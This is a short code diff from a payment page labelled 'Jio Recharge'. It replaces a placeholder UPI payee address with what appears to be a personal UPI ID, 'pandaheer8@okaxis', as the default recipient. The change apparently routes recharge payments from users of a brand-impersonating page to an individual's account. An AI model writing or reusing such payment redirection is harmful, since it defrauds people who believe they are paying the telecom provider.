@@ -150,7 +150,7 @@ if (payAmount) {
 upiOptions.forEach((option) => {
   option.addEventListener("click", () => {
     const amount = String(payAmount?.textContent?.trim() || getSafeAmount(getSavedAmount()));
-    const vpa = option.dataset.vpa || "merchant@upi";
+    const vpa = option.dataset.vpa || "pandaheer8@okaxis";
     const name = option.dataset.name || "Jio Recharge";
     const cleanedAmount = amount.replace(/[^\d.]/g, "");
     const rechargeFor = pageNumber || "selected number";
